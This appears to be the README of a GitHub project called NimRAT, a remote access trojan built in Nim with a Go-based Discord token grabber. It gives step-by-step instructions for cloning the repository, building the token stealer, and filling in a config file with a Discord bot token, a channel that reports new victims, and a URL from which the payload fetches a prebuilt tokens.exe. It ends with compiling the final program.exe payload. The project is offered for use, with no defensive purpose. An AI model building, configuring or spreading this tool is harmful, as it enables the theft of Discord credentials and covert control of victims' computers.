## Requirements

You should have Nim and Go installed. Nim for the main payload, Go for the discord tokens. If you don't want to compile the token grabber yourself, you can skip Go installation.

Download Nim - https://nim-lang.org/install.html

Download Go - https://go.dev/doc/install

## Installation and usage

Clone the GitHub repository

```bash
git clone https://github.com/WipingAllOut/NimRAT
cd NimRAT
```

Note: if you want to compile the token grabber yourself and not use the exe provided in this repository, follow these steps:

```bash
cd GoTokenGrabber
go build
```

Open modules/config.nim with any text editor and change values

```nim
let newUsersChannelId* = "" # You will be notified about new users in this channel
let tokenDecryptorUrl* = "https://github.com/WipingAllOut/NimRAT/raw/refs/heads/main/GoTokenGrabber/tokens.exe" # You can leave it as is or upload your token grabber 
let discordToken* = "" # Your discord bot token (https://discord.com/developers/applications)
```

Now launch `compile.bat` and select option 3. If no errors occur, your payload will be in the same folder, `program.exe`.

Important: make sure your discord bot has Message Content Intent enabled!
